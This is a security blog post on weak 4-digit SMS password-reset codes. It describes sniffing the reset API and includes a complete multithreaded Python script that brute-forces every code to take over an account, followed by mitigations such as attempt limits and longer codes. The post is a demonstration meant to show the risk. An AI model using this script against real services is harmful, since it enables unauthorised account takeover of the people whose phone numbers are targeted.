---
author: ZhgChgLi
categories:
- ZRealm Dev.
date: 2021-03-14T15:57:38.256+0000
description: Discover how weak SMS verification codes expose accounts to brute force
  attacks. Learn Python-based methods to identify vulnerabilities and strengthen your
  authentication process for enhanced security outcomes.
image:
  path: /assets/99a6cef90190/1*xtbLIfJ6KELkGYeVCnzSFg.jpeg
last_modified_at: 2024-04-13T16:30:08.749+0000
render_with_liquid: false
tags:
- english
- iOS App Development
- Hacker
- Web Security
- Password Security
- Security Token
title: SMS Verification Code Security｜Prevent Brute Force Attacks with Python Demonstrations
---

### Security Issues with SMS Verification Code Strength for Password Recovery

Using Python to Demonstrate the Severity of Brute Force Attacks

![Photo by [Matt Artz](https://unsplash.com/@mattartz?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText){:target="_blank"}](/assets/99a6cef90190/1*xtbLIfJ6KELkGYeVCnzSFg.jpeg)

Photo by [Matt Artz](https://unsplash.com/@mattartz?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText){:target="_blank"}

### Introduction

This article contains little cybersecurity technical content; it is simply a sudden idea that came up while using a certain platform's website recently. I decided to casually test its security and ended up discovering an issue.

When using the password recovery feature on websites or apps, there are usually two options. One is to enter your username or email, and then a reset password page link containing a token is sent to your inbox. Clicking the link opens the page where you can reset your password. This part generally has no issues unless, as mentioned in the [previous article](../142244e5f07a/), there are design flaws that cause problems.

Another way to recover your password is by entering the linked phone number (mostly used in APP services). A verification code will be sent via SMS to the phone, and entering the code completes the password reset. For convenience, most services use numeric codes as verification codes. Additionally, since iOS ≥ 11 added the [Password AutoFill](../948ed34efa09/) feature, the keyboard will automatically detect and prompt the verification code when the phone receives it.

![](/assets/99a6cef90190/1*f7frmgNsLwW1Q9e9QtAt1A.png)

Check the [official documentation](https://developer.apple.com/documentation/security/password_autofill/about_the_password_autofill_workflow){:target="_blank"}, Apple does not provide a format rule for automatically filling verification codes; however, almost all services that support autofill use pure numbers. It is inferred that only numbers are allowed, and complex combinations of numbers and letters are not supported.

### Question

Because numeric passwords can be brute-forced, especially 4-digit codes; the combinations range only from 0000 to 9999, totaling 10,000 combinations; using multiple threads and machines can split the workload for brute-force cracking.

Assuming each verification request takes 0.1 seconds to respond, 10,000 combinations = 10,000 requests

```
Time required to crack: ((10,000 * 0.1) / number of threads) seconds
```

Even without opening a thread, it only takes about 16 minutes to try the correct SMS verification code.

> *Besides insufficient password length and complexity, there is also the issue of no attempt limit and overly long validity period for verification codes.*

### Combination

In summary, this security issue is common on the app side. Web services usually add CAPTCHA verification after multiple failed attempts or require additional security questions when requesting password resets, increasing the difficulty of sending verification requests. Additionally, if web services do not separate front-end and back-end, each verification request requires loading the entire webpage, lengthening the response time.

On the app side, password reset processes are often simplified for user convenience, and some apps even allow login through phone number verification; if there is no protection on the API side, this can lead to security vulnerabilities.

### Practice

> ⚠️Warning⚠️ This article is for demonstrating the severity of this security issue only. Do not use it for malicious purposes.

#### Sniffing Authentication Request API

Everything starts with sniffing. For this part, you can refer to the previous articles "[APP uses HTTPS transmission, but data is still stolen.](../46410aaada00/)" and "[Using Python + Google Cloud Platform + Line Bot to automate routine tasks](../70a1409b149a/)". The first article explains the principle, and it is recommended to use [Proxyman](https://proxyman.io/){:target="_blank"} from the second article for sniffing.

![](/assets/99a6cef90190/1*22uVkKdpDXnwEygDa9lwyA.png)

For websites with separated front-end and back-end, you can also use Chrome -> Inspect -> Network -> to see what requests are sent after submitting the verification code.

![](/assets/99a6cef90190/1*Skm69eJiZKeK4_QUU0wIoQ.png)

**Assuming the received verification code request is:**

```
POST https://zhgchg.li/findPWD
```

**Response:**

```
{
   "status":false
   "msg":"Verification error"
}
```

#### Writing a Brute Force Python Script

crack.py:

```python
import random
import requests
import json
import threading

phone = "0911111111"
found = False
def crack(start, end):
    global found
    for code in range(start, end):
        if found:
            break
        
        stringCode = str(code).zfill(4)
        data = {
            "phone" : phone,
            "code": stringCode
        }

        headers = {}
        try:
            request = requests.post('https://zhgchg.li/findPWD', data = data, headers = headers)
            result = json.loads(request.content)
            if result["status"] == True:
                print("Code is:" + stringCode)
                found = True
                break
            else:
                print("Code " + stringCode + " is wrong.")
        except Exception as e:
            print("Code "+ stringCode +" exception error \(" + str(e) + ")")

def main():
    codeGroups = [
        [0,1000],[1000,2000],[2000,3000],[3000,4000],[4000,5000],
        [5000,6000],[6000,7000],[7000,8000],[8000,9000],[9000,10000]
    ]
    for codeGroup in codeGroups:
        t = threading.Thread(target = crack, args = (codeGroup[0],codeGroup[1],))
        t.start()

main()
```

After running the script, we get:

![](/assets/99a6cef90190/1*jGp69g9H1BjLqq6SdIHRBw.png)

```
Verification code equals: 1743
```

Enter `1743` to reset the password, replace the original password, or log in directly.

> Bigo!

### Solution

- Password reset with additional information verification (e.g., birthdate, security questions)

- Increase the verification code length (e.g., Apple’s 6-digit code) and increase the verification code complexity (if it does not affect the AutoFill function)

- Invalidate the verification code after more than 3 failed attempts, requiring the user to request a new code.

- Verification Code Expiration Time Shortened

- Lock device after too many failed verification attempts, add CAPTCHA verification

- APP should implement more SSL Pinning and transmission encryption/decryption (to prevent sniffing)

### Further Reading

- [Revealing a Clever Website Vulnerability Discovered a Few Years Ago](../142244e5f07a/)

- [How to Create an Engaging Engineering CTF Competition](../729d7b6817a4/)

- [The app uses HTTPS for transmission, but data was still stolen.](../46410aaada00/)

- [Automate Routine Tasks with Python + Google Cloud Platform + Line Bot](../70a1409b149a/)

If you have any questions or feedback, feel free to [contact me](https://www.zhgchg.li/contact){:target="_blank"}.

*[Post](https://medium.com/zrealm-ios-dev/%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A2%BC%E4%B9%8B%E7%B0%A1%E8%A8%8A%E9%A9%97%E8%AD%89%E7%A2%BC%E5%BC%B7%E5%BA%A6%E5%AE%89%E5%85%A8%E5%95%8F%E9%A1%8C-99a6cef90190){:target="_blank"} converted from Medium by [ZMediumToMarkdown](https://github.com/ZhgChgLi/ZMediumToMarkdown){:target="_blank"}.*